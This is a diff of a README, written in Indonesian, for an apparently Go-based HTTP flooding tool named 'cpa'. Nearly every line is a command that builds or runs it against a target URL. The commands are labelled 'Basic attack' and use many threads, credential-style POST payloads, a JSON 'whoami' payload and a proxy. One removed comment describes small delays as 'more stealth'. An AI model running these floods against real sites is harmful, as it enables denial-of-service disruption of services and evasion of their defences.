@@ -7,20 +7,20 @@ Gunakan dengan bijak dan bertanggung jawab.
 # Compile
 go build -o cpa cpa.go
 
-# Lihat help
-./cpa -help
+# Lihat semua metode
+./cpa -methods
 
-# Compile
-go build -o cpa cpa.go
+# Basic attack
+./cpa -target https://example.com -method flood -threads 100 -duration 60
 
-# Delay random antara 100-500ms per request
-./cpa -target https://example.com -method flood -threads 50 -duration 30 -delay-min 100 -delay-max 500
+# Dengan custom payload
+./cpa -target https://example.com -method post -payload "username=admin&password=123" -threads 50 -duration 30
 
-# Delay tetap 200ms (min dan max sama)
-./cpa -target https://example.com -method https -threads 30 -requests 1000 -delay-min 200 -delay-max 200
+# Random payload
+./cpa -target https://example.com -method post -random-payload -threads 100 -duration 60
 
-# Delay kecil (10-50ms) agar tetap cepat tapi sedikit lebih stealth
-./cpa -target https://example.com -method flood -threads 100 -duration 60 -delay-min 10 -delay-max 50
+# JSON payload
+./cpa -target https://api.example.com -method json -payload '{"cmd":"whoami"}' -threads 50
 
-# Tanpa delay (default, untuk kecepatan maksimal)
-./cpa -target https://example.com -method flood -threads 100 -duration 30
+# Dengan delay dan proxy
+./cpa -target https://example.com -method flood -threads 100 -duration 60 -delay-min 100 -delay-max 500 -proxy http://127.0.0.1:8080
